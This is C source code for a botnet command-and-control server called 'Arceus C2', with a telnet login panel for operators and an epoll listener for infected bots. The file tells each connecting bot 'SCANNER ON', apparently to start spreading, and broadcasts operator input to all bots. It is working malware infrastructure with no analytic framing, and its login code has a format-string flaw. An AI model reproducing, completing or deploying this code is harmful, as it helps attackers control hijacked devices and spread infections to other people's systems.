#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000
//////////////////////////////////////////////
// Project Description and alternatives
#define Project "Arceus C2 Chatroom"
#define Start "10/12/19"
#define End "Not there yet c;"
#define Developer "Georgia Cri / FlexingOnLamers"
//////////////////////////////////////////////
struct account {
    char user[20]; 
    char password[20];
    char acc[20];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

////////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {                     
                       send(i, "\e[97m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                //  printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\e[90m| \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("buf: \"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0;Arceus - Clients: %d %c", '\033', managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
 
                sleep(2);
        }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("chat.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\n%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock) { 
        int thefd = (int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
        char *admin = "admin"; 
        memset(buf, 0, sizeof buf);
        char kurd[2048];
        memset(kurd, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("chat.txt", "r"); // format: user pass
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].acc);
            ++j;
        }
        sprintf(kurd, "");
        if(send(thefd, kurd, strlen(kurd), MSG_NOSIGNAL) == -1) goto end;  
        sprintf(kurd, "\e[90mUsername\033[1;37m: \e[90m");
        if(send(thefd, kurd, strlen(kurd), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);

        if(strcmp(nickstring, accounts[find_line].user) == 0){                  
        sprintf(kurd, "\e[90mPassword\033[1;37m: \e[90m");
        if(send(thefd, kurd, strlen(kurd), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto kurd;
        }
        failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000];
        char failed_line2[5000];

        sprintf(failed_line1, "\x1b[1;37mIf you see this, then you shouldnt be here.\r\n"); // You Have Failed!
        sprintf(failed_line2, "\x1b[1;37mThis attempt has been logged.\r\n"); // You Have Failed!

        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        goto end; // You Have Failed!

        kurd:// We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        char chat1 [5000];
        char chat2 [5000];
        char chat3 [5000];
        char chat4 [5000];
        char chat5 [5000];
        char chat6 [5000];
        char chat7 [5000];
        char chat8 [5000];
        char chat9 [5000];
        char chat10 [5000];
        char chat11 [5000];
        char chat12 [5000];
        char chat13 [5000];
        char chat14 [5000];
        char chat15 [5000];
        char chat16 [5000];
        char chat17 [5000];
        char chat18 [5000];
        char clearscreen [5000];
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[2J\033[1;1H");
    
        sprintf(chat1,  "\e[90m                         ______                     \r\n");
        sprintf(chat2,  "\e[90m _________        .---===      ===---.  \x1b[0;32mPoppin pills and poppin shells\r\n");
        sprintf(chat3,  "\e[90m:______.-':      :  .--------------.  :  \r\n");
        sprintf(chat4,  "\e[90m| ______  |      | :                : |  \r\n");
        sprintf(chat5,  "\e[90m|:______B:|      | |  \x1b[0;32mArceus\e[90m      | |             \r\n");
        sprintf(chat6,  "\e[90m|:______B:|      | |                | |             \r\n");
        sprintf(chat7,  "\e[90m|:______B:|      | |  \x1b[0;32mWe arent like\e[90m | |             \r\n");
        sprintf(chat8,  "\e[90m|         |      | |  \x1b[0;32mothers...\e[90m     | |             \r\n");
        sprintf(chat9,  "\e[90m|:_____:  |      | |                | |             \r\n");
        sprintf(chat10, "\e[90m|    ==   |      | :  \x1b[0;32m319 DGs  \e[90m      : |             \r\n");
        sprintf(chat11, "\e[90m|       O |      :  '--------------'  :             \r\n");
        sprintf(chat12, "\e[90m|       o |      :'---...______...---'              \r\n");
        sprintf(chat13, "\e[90m|       o |-._.-i___/'             \._              \r\n");
        sprintf(chat14, "\e[90m|'-.____o_|   '-.   '-...______...-'  `-._          \r\n");
        sprintf(chat15, "\e[90m:_________:      `.____________________   `-.___.-. \r\n");
        sprintf(chat16, "\e[90m                 .'.eeeeeeeeeeeeeeeeee.'.      :___:\r\n");
        sprintf(chat17, "\e[90m               .'.eeeeeeeeeeeeeeeeeeeeee.'.         \r\n");
        sprintf(chat18, "\e[90m              :____________________________:\r\n");

        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, chat1, strlen(chat1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat2, strlen(chat2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat3, strlen(chat3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat4, strlen(chat4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat5, strlen(chat5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat6, strlen(chat6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat7, strlen(chat7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat8, strlen(chat8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat9, strlen(chat9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat10, strlen(chat10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat11, strlen(chat11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat12, strlen(chat12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat13, strlen(chat13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat14, strlen(chat14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat15, strlen(chat15), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat16, strlen(chat16), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat17, strlen(chat17), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat18, strlen(chat18), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) {
        sprintf(kurd, "\e[90m| ", accounts[find_line].user, buf);
        if(send(thefd, kurd, strlen(kurd), MSG_NOSIGNAL) == -1) goto end;
        break;      
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;

        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
        if(strstr(buf, "USERS") || strstr(buf, "users") || strstr(buf, "online") || strstr(buf, "ONLINE")) // We Are Reading The Connections!
        {  
        sprintf(kurd, "Users Online:\x1b[1;31m %d \r\n", managesConnected);
        if(send(thefd, kurd, strlen(kurd), MSG_NOSIGNAL) == -1);
        }
        if (strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "cls") || strstr(buf, "CLS")) // We Are Clearing Screen!
        { 
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, chat1, strlen(chat1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat2, strlen(chat2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat3, strlen(chat3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat4, strlen(chat4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat5, strlen(chat5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat6, strlen(chat6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat7, strlen(chat7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat8, strlen(chat8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat9, strlen(chat9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat10, strlen(chat10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat11, strlen(chat11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat12, strlen(chat12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat13, strlen(chat13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat14, strlen(chat14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat15, strlen(chat15), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat16, strlen(chat16), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat17, strlen(chat17), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, chat18, strlen(chat18), MSG_NOSIGNAL) == -1) goto end;
        }
        if(strstr(buf, "LOGOUT")) // WE ARE LOGGING OUT!
        {  
        printf("\x1b[1;37m[\e[90mArceus\x1b[1;37m] User:\e[90m %s \x1b[1;37mHas Logged Out Of The Chatroom!\n", accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("logout.log", "a");
        fprintf(logFile, "\x1b[1;37m[\e[90mArceus\x1b[1;37m] User:\e[90m %s \x1b[1;37mHas Logged Out Of The Chatroom!\n", accounts[find_line].user, buf);
        fclose(logFile);
        goto end;
        }
        if(strstr(buf, "logout")) // WE ARE LOGGING OUT!
        {  
        printf("\x1b[1;37m[\e[90mArceus\x1b[1;37m] User:\x1b[1;36m %s \x1b[1;37mHas Logged Out!\n", accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("logout.log", "a");
        fprintf(logFile, "\x1b[1;37m[\e[90mArceus\x1b[1;37m] User:\x1b[1;36m %s \x1b[1;37mHas Logged Out!\n", accounts[find_line].user, buf);
        fclose(logFile);
        goto end;
        }
        trim(buf);
        sprintf(kurd, "\e[90m| ", accounts[find_line].user, buf);
        if(send(thefd, kurd, strlen(kurd), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("%s: \"%s\"\n",accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("chat.log", "a");
        fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].user, buf);
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
        }
        end:    // cleanup dead socket
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\e[90mArceus\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\x1b[1;37m[\e[90mArceus\x1b[1;37m] Incoming Connection From:\x1b[1;36m ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("IP.log", "a");
        fprintf(logFile, "%d.%d.%d.%d\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
            printf("\x1b[1;37m[\e[90mArceus\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
            return 0;
        }
        else if (threads < 1000)
        {
            printf("");
        }
        printf("\e[90mArceus \e[97m[\e[90mC2\e[97m]\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "STRING");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
